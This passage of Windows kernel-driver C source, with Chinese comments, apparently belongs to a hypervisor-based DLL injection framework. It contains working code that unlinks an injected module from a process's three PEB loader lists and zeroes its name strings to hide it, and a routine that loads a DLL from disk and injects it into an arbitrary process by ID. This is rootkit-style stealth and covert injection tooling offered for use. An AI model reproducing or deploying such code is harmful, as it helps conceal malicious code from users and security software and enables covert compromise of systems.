 * 隐藏注入的模块（从 PEB LdrModuleList 解链）
 */
NTSTATUS
HvHideInjectedModule(
    _In_ ULONG ProcessId,
    _In_ PVOID ModuleBase
)
{
    NTSTATUS status;
    PEPROCESS process;
    KAPC_STATE_INJ apcState;
    PPEB peb;
    PVOID ldr;
    PLIST_ENTRY listHead;
    PLIST_ENTRY listEntry;
    BOOLEAN found = FALSE;
    
    status = HvAttachProcess(ProcessId, &process, &apcState);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    peb = PsGetProcessPeb(process);
    if (!peb) {
        HvDetachProcess(process, &apcState);
        return STATUS_NOT_FOUND;
    }
    
    __try {
        // PEB_LDR_DATA
        // 注意: 以下 PEB/LDR_DATA_TABLE_ENTRY 偏移在 Win7 SP1 → Win11 25H2 x64 用户态稳定:
        //   PEB+0x18           = Ldr (PEB_LDR_DATA*)
        //   LDR_DATA+0x10      = InLoadOrderModuleList (LIST_ENTRY)
        //   LDR_TABLE_ENTRY:
        //     +0x10  InMemoryOrderLinks
        //     +0x20  InInitializationOrderLinks
        //     +0x30  DllBase
        //     +0x48  FullDllName  (UNICODE_STRING)
        //     +0x58  BaseDllName  (UNICODE_STRING)
        // 这些是 ntdll 公开类型 + 微软多年保持的 ABI; 不需要 Win10/11 版本分支.
        // 若未来支持 32-bit guest 进程, 需要 WOW64 PEB 分支.
        ldr = *(PVOID*)((PUCHAR)peb + 0x18);
        if (!ldr) {
            HvDetachProcess(process, &apcState);
            return STATUS_NOT_FOUND;
        }

        // InLoadOrderModuleList
        listHead = (PLIST_ENTRY)((PUCHAR)ldr + 0x10);
        
        for (listEntry = listHead->Flink; listEntry != listHead; listEntry = listEntry->Flink) {
            // DllBase 在 LDR_DATA_TABLE_ENTRY + 0x30
            PVOID dllBase = *(PVOID*)((PUCHAR)listEntry + 0x30);
            
            if (dllBase == ModuleBase) {
                // 从三个链表中解链
                
                // 解链 InLoadOrderLinks
                PLIST_ENTRY prev = listEntry->Blink;
                PLIST_ENTRY next = listEntry->Flink;
                prev->Flink = next;
                next->Blink = prev;
                
                // 解链 InMemoryOrderLinks
                PLIST_ENTRY memEntry = (PLIST_ENTRY)((PUCHAR)listEntry + 0x10);
                prev = memEntry->Blink;
                next = memEntry->Flink;
                if (prev && next) {
                    prev->Flink = next;
                    next->Blink = prev;
                }
                
                // 解链 InInitializationOrderLinks
                PLIST_ENTRY initEntry = (PLIST_ENTRY)((PUCHAR)listEntry + 0x20);
                prev = initEntry->Blink;
                next = initEntry->Flink;
                if (prev && next) {
                    prev->Flink = next;
                    next->Blink = prev;
                }
                
                // 清空模块名（进一步隐藏）
                PUNICODE_STRING baseName = (PUNICODE_STRING)((PUCHAR)listEntry + 0x58);
                PUNICODE_STRING fullName = (PUNICODE_STRING)((PUCHAR)listEntry + 0x48);
                if (baseName->Buffer) {
                    RtlZeroMemory(baseName->Buffer, baseName->Length);
                }
                if (fullName->Buffer) {
                    RtlZeroMemory(fullName->Buffer, fullName->Length);
                }
                
                found = TRUE;
                DbgPrint("[Injection-Hide] Module unlinked from PEB: %p\n", ModuleBase);
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[Injection-Hide] Exception hiding module: 0x%X\n", status);
    }
    
    HvDetachProcess(process, &apcState);
    
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

// ============================================================
// 调试和诊断
// ============================================================

VOID
HvInjectionPrintStatus(VOID)
{
    PLIST_ENTRY entry;
    PINJECTED_MODULE_ENTRY moduleEntry;
    KIRQL oldIrql;
    
    DbgPrint("[Injection] ========== Status ==========\n");
    DbgPrint("[Injection] Initialized: %s\n", 
        g_InjectionManager.Initialized ? "Yes" : "No");
    DbgPrint("[Injection] Injected Modules: %d\n", 
        g_InjectionManager.InjectedModuleCount);
    
    if (g_InjectionManager.Initialized) {
        KeAcquireSpinLock(&g_InjectionManager.Lock, &oldIrql);
        
        for (entry = g_InjectionManager.InjectedModuleList.Flink;
             entry != &g_InjectionManager.InjectedModuleList;
             entry = entry->Flink)
        {
            moduleEntry = CONTAINING_RECORD(entry, INJECTED_MODULE_ENTRY, ListEntry);
            DbgPrint("[Injection]   PID=%d Base=%p Size=0x%llX Hidden=%s\n",
                moduleEntry->ProcessId,
                moduleEntry->ModuleBase,
                (ULONGLONG)moduleEntry->ModuleSize,
                moduleEntry->IsHidden ? "Yes" : "No");
        }
        
        KeReleaseSpinLock(&g_InjectionManager.Lock, oldIrql);
    }
    
    DbgPrint("[Injection] ============================\n");
}

ULONG
HvGetInjectedModuleCount(VOID)
{
    return g_InjectionManager.InjectedModuleCount;
}

// ============================================================
// 内部辅助函数
// ============================================================

static PINJECTED_MODULE_ENTRY
InjectionFindModule(
    _In_ ULONG ProcessId,
    _In_ PVOID ModuleBase
)
{
    PLIST_ENTRY entry;
    PINJECTED_MODULE_ENTRY moduleEntry;
    KIRQL oldIrql;
    PINJECTED_MODULE_ENTRY result = NULL;
    
    if (!g_InjectionManager.Initialized) {
        return NULL;
    }
    
    KeAcquireSpinLock(&g_InjectionManager.Lock, &oldIrql);
    
    for (entry = g_InjectionManager.InjectedModuleList.Flink;
         entry != &g_InjectionManager.InjectedModuleList;
         entry = entry->Flink)
    {
        moduleEntry = CONTAINING_RECORD(entry, INJECTED_MODULE_ENTRY, ListEntry);
        
        if (moduleEntry->ProcessId == ProcessId && moduleEntry->ModuleBase == ModuleBase) {
            result = moduleEntry;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_InjectionManager.Lock, oldIrql);
    
    return result;
}

// ============================================================
// HvInjectDllFromFile - 从文件路径注入 DLL
// ============================================================

NTSTATUS
HvInjectDllFromFile(
    _In_ ULONG ProcessId,
    _In_ PCWSTR DllPath,
    _Out_opt_ PHV_INJECTION_RESULT OutResult
)
{
    NTSTATUS status;
    HANDLE fileHandle = NULL;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING filePath;
    FILE_STANDARD_INFORMATION fileInfo;
    PVOID fileBuffer = NULL;
    LARGE_INTEGER fileSize;
    LARGE_INTEGER byteOffset;
    
    DbgPrint("[Injection] HvInjectDllFromFile: PID=%d, Path=%ws\n", ProcessId, DllPath);
    
    if (OutResult) {
        RtlZeroMemory(OutResult, sizeof(HV_INJECTION_RESULT));
    }
    
    // 验证参数
    if (ProcessId == 0 || DllPath == NULL || DllPath[0] == L'\0') {
        DbgPrint("[Injection] Invalid parameters\n");
        return STATUS_INVALID_PARAMETER;
    }
    
    // 初始化文件路径
    RtlInitUnicodeString(&filePath, DllPath);
    
    InitializeObjectAttributes(
        &objAttr,
        &filePath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL
    );
    
    // 打开文件
    status = ZwCreateFile(
        &fileHandle,
        GENERIC_READ | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL,
        0
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] Failed to open file: 0x%X\n", status);
        return status;
    }
    
    // 获取文件大小
    status = ZwQueryInformationFile(
        fileHandle,
        &ioStatus,
        &fileInfo,
        sizeof(fileInfo),
        FileStandardInformation
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] Failed to query file info: 0x%X\n", status);
        ZwClose(fileHandle);
        return status;
    }
    
    fileSize = fileInfo.EndOfFile;
    
    if (fileSize.QuadPart == 0 || fileSize.QuadPart > 100 * 1024 * 1024) {  // 最大 100MB
        DbgPrint("[Injection] Invalid file size: %lld\n", fileSize.QuadPart);
        ZwClose(fileHandle);
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    
    // 分配缓冲区（走 HvCompat 包装，避免 ExAllocatePoolWithTag 弃用警告）
    fileBuffer = HvAllocateNonPaged((SIZE_T)fileSize.QuadPart, 'jnID');
    if (!fileBuffer) {
        DbgPrint("[Injection] Failed to allocate buffer for file\n");
        ZwClose(fileHandle);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 读取文件内容
    byteOffset.QuadPart = 0;
    status = ZwReadFile(
        fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        fileBuffer,
        (ULONG)fileSize.QuadPart,
        &byteOffset,
        NULL
    );
    
    ZwClose(fileHandle);
    fileHandle = NULL;
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] Failed to read file: 0x%X\n", status);
        ExFreePoolWithTag(fileBuffer, 'jnID');
        return status;
    }
    
    // 验证 PE 头 (使用已定义的类型)
    if (((PIMAGE_DOS_HEADER_INJ)fileBuffer)->e_magic != 0x5A4D) {  // "MZ"
        DbgPrint("[Injection] Invalid DOS signature\n");
        ExFreePoolWithTag(fileBuffer, 'jnID');
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    
    // 调用 DLL 注入
    status = HvInjectDll(
        ProcessId,
        fileBuffer,
        (SIZE_T)fileSize.QuadPart,
        OutResult
    );
    
    // 释放文件缓冲区
    ExFreePoolWithTag(fileBuffer, 'jnID');
    
    if (NT_SUCCESS(status)) {
        DbgPrint("[Injection] DLL injection from file successful\n");
    } else {
        DbgPrint("[Injection] DLL injection from file failed: 0x%X\n", status);
    }
    
    return status;
}
